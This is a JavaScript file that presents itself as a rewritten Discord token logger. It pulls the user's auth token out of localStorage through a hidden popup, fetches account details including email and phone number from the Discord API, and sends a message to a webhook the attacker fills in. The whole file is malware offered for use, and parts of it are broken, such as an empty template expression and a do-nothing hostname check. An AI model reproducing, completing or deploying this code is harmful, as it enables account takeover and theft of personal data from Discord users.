// Rewritten version of the old Token logger, the other one was OLD and GARBAGE AS HECK

var webhook = "<YOUR_WEBHOOK_HERE>"; // Theres Many tuts on getting a webhook
var pingme = true // Ping @everyone

// Details (dont put anything)
var id;
var username;
var avatar;
var tag;
var banner_color;
var accent_color;
var locale;
var email;
var verified;
var phone;

if (window.location.hostname != "discord.com") {} // We dont want anyone-else on discord

function GetInfo(token) {
    var request = new XMLHttpRequest();
    
    request.open("GET", "https://discord.com/api/v9/users/@me");
    request.setRequestHeader("Authorization", token);
    
    request.onreadystatechange = function() {
     // We've got the request so now do something 
       if (this.readyState == 4 && this.status == 200) {
           const req = request.responseText;
           const parsed = JSON.parse(req);
           
           var idr = parsed.id;
           var usernamer = parsed.username;
           var avatarr = parsed.avatar;
           var tagr = parsed.discriminator; // why discriminator? lol
           var banner_colorr = parsed.banner_color;
           var accent_colorr = parsed.accent_color;
           var localer = parsed.locale;
           var emailr = parsed.email;
           var verifiedr = parsed.verified;
           var phoner = parsed.phone;
           
           phone = phoner
           verified = verifiedr;
           email = emailr;
           locale = localer;
           accent_color = accent_colorr;
           banner_color = banner_colorr;
           tag = tagr;
           avatar = avatarr;
           username = usernamer;
           id = idr;
        } else {return "Could not fetch the user details."} 
    }
    request.send();
}

function GetToken() {
  var popup = window.open('', '', `top=0,left=${screen.width-0},width=0,height=${screen.height}`);
    
  window.dispatchEvent(new Event('beforeunload'));
  var token = popup.localStorage.token;
  token = token.slice(1, -1); // No more quotes
    
  return token;
}

function SendMsg(msg) {
    const request = new XMLHttpRequest();
    request.open("POST", webhook);
  
    request.setRequestHeader('Content-type', 'application/json'); // We need this as we are expecting a JSON request.

     const params = {
        content: msg
     }

     request.send(JSON.stringify(params));
}

function SetUp() {
    SendMsg(`**${}**`)
}

SetUp()
